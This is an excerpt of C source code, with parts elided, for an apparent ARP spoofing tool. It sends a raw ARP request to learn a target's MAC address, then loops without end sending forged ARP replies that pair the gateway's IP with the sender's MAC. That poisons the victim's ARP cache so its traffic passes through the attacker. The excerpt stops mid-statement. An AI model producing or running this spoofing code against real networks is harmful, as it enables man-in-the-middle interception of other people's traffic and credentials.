...
struct ether_arp* fill_arp_packet(const unsigned char* src_mac_addr,
	const unsigned char* dst_mac_addr, const char* src_ip, const char* dst_ip, int op)
{
...
void arp_request(const char* if_name, const char* dst_ip) {
	...
	/* arp 包 */
	arp_packet = fill_arp_packet(src_mac_addr, tarmac, src_ip, dst_ip, ARPOP_REQUEST);
	memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
	socklen_t len = sizeof(struct sockaddr_ll);
	ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr*)&saddr_ll, len);
	if (ret_len == 42)
		printf("send arp request ok!!!\n");
	ret_len = recvfrom(sock_raw_fd, recvbuf, 42, 0, (struct sockaddr*)&saddr_ll, &len);
	if (ret_len == 42) {
		if (!memcmp(recvbuf + 28, buf + 38, 4)) {
			memcpy(tarmac, recvbuf + 22, 6);
			printf("Target mac: %02x:%02x:%02x:%02x:%02x:%02x\n", tarmac[0], tarmac[1], tarmac[2], tarmac[3], tarmac[4], tarmac[5]);
		}
	}
	sleep(1);
	while (1) {
		...
		eth_header = (struct ether_header*)buf;
		memcpy(eth_header->ether_dhost, dst_mac_addr, ETH_ALEN);
		arp_packet = fill_arp_packet(src_mac_addr, tarmac, gateway_ip, dst_ip, ARPOP_REPLY);
		memcpy(buf + ETHER_HEADER_LEN, arp_packet, ETHER_ARP_LEN);
		socklen_t len = sizeof(struct sockaddr_ll);
		ret_len = sendto(sock_raw_fd, buf, ETHER_ARP_PACKET_LEN, 0, (struct sockaddr*)&saddr_ll, len);
		if (ret_len == 42)
